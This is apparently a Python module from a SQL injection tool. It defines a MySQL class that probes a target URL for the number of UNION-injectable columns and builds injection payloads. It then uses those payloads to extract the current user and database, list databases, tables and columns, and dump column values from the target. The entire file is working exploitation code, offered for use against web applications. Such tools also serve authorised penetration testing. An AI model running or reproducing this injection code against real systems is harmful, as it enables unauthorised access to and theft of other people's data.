#! /usr/bin/env python
# -*- coding:utf-8 -*-
# author:flystart
# home:www.flystart.org
# time:2019/7/30


from lib.core.dbs.databases import Databases
from lib.core.common import format_data, match_data, match_all_data,random_str,format_hex,un_hex,find_success,tamper
from lib.core.request.connection import req
from lib.core.data import conf,logger
from lib.parse.payload import SQL,BOUNDARY,SEP_CHAR
import copy
import sys
# req = Request(headers,conf.proxies,conf.timeout,method='get')
if conf.flag:
    success_flag = conf.flag
keys=list


class Mysql(Databases):
    def __init__(self,tech):
        Databases.__init__(self,tech)
        self.set_actual_boundary()
        self.set_query(SQL.base_query)

    def set_actual_boundary(self):
        is_set = False
        token = '10000'
        table_name = "information_schema.schemata"
        self.set_query(SQL.query)
        l = ["NULL"]*25
        for i in range(25):
            temp= copy.deepcopy(l)
            temp[i] = token
            col_name = [','.join(temp[:i+1])]
            payload,_ = self.get_payload(table_name,col_name)
            url = conf.url
            res = req.connection(url,payload)
            text = res.text
            if token in text:
                break
        l = ["NULL"]*3
        token = format_hex(random_str())
        for i in range(len(l)):
            pack = copy.deepcopy(l)
            pack[i] = token
            col_name = [','.join(pack)]
            payload, _ = self.get_payload(table_name, col_name)
            url = conf.url
            res = req.connection(url, payload)
            text = res.text
            if un_hex(token) in text:
                boudary = payload.replace(token, "concat(0x3a2d2d3a,%query,0x3a2d2d3a)")
                self.ini_boundary = boudary
                self.set_boundary(boudary)
                is_set = True
                break
        if not is_set:
            logger.error("Set Boundary Error!!!")
            sys.exit(0)

    def get_value_from_response(self, text, token):
        res = ""
        res = match_data(text, token)
        return res

    def get_payload(self, table_name, col_name, i="0", index="1", value=""):  # (index,vaule) is used blind
        cols = []
        token = ":--:"
        for col in col_name:
            cols.append(col)
            cat_str = cols[0]
        boundary = SEP_CHAR + self.boundary.replace('%value',value).replace('%index',index)
        query = self.query.replace('t_n',table_name).replace('%s', cat_str).replace('%d', i)
        boundary,query = tamper(boundary,query)
        payload = boundary
        payload = payload.replace('%query',query)
        payload = format_data(payload)
        if conf.debug:
            logger.success(payload)
        return payload,token

    def get_counts(self, table_name, col_name):
        col_name = ["count(*)"]
        counts = ''
        payload, token = self.get_payload(table_name, col_name, '0')
        url = conf.url
        res = req.connection(url, payload=payload)
        counts = self.get_value_from_response(res.text, token)
        logger.info("CountsEnties:" + counts)
        return counts

    def get_current_user(self):
        table_name = 'information_schema.schemata'
        col_name = ["user()"]
        user = ""
        payload, token = self.get_payload(table_name, col_name)
        url = conf.url
        res = req.connection(url, payload=payload)
        user = self.get_value_from_response(res.text, token)
        logger.info("CurrentUser:" + user)
        return user

    def get_current_db(self):
        table_name = 'information_schema.schemata'
        col_name = ["database()"]
        database = ""
        payload, token = self.get_payload(table_name, col_name)
        url = conf.url
        res = req.connection(url, payload=payload)
        database = self.get_value_from_response(res.text, token)
        logger.info("CurrentBase:" + database)
        return database

    def get_dbs(self):
        table_name = 'information_schema.schemata'
        col_name = ["schema_name"]
        counts = self.get_counts(table_name, col_name)
        logger.info("all dbs counts is :%s" % counts)
        dbs = []
        for i in range(int(counts)):
            payload, token = self.get_payload(table_name, col_name, str(i))
            url = conf.url
            res = req.connection(url, payload=payload)
            db = self.get_value_from_response(res.text, token)
            dbs.append(db)
            logger.info("Ent:" + db)
        return dbs

    def get_tables(self, db):
        table_name = 'information_schema.tables'
        col_name = ["table_name"]
        query = SQL.query_tab.replace("{db}", format_hex(db))
        self.set_query(query)
        counts = self.get_counts(table_name, col_name)
        logger.info("all dbs counts is :%s" % counts)
        tables = []
        for i in range(int(counts)):
            payload, token = self.get_payload(table_name, col_name, str(i))
            url = conf.url
            res = req.connection(url, payload=payload)
            table = self.get_value_from_response(res.text, token)
            tables.append(table)
            logger.info("Ent:" + table)
        return tables

    def get_columns(self, db, table):
        table_name = 'information_schema.columns'
        col_name = ["column_name"]
        query = SQL.query_col.replace("{db}", format_hex(db)).replace("{table}", format_hex(table))
        self.set_query(query)
        counts = self.get_counts(table_name, col_name)
        columns = []
        for i in range(int(counts)):
            payload, token = self.get_payload(table_name, col_name, str(i))
            url = conf.url
            res = req.connection(url, payload=payload)
            col = self.get_value_from_response(res.text, token)
            columns.append(col)
            logger.info("Ent:" + col)
        return columns

    def dump(self, db, table, col):
        table_name = '{0}.{1}'.format(db, table)
        col_name = ["{0}".format(col)]
        self.reset_query()
        counts = self.get_counts(table_name, col_name)
        data = []
        for i in range(int(counts)):
            payload, token = self.get_payload(table_name, col_name, str(i))
            url = conf.url
            res = req.connection(url, payload=payload)
            value = self.get_value_from_response(res.text, token)
            logger.info("Ent:{0}.{1}:{2}".format(table_name, col_name, value))
            data.append(value)
        return data
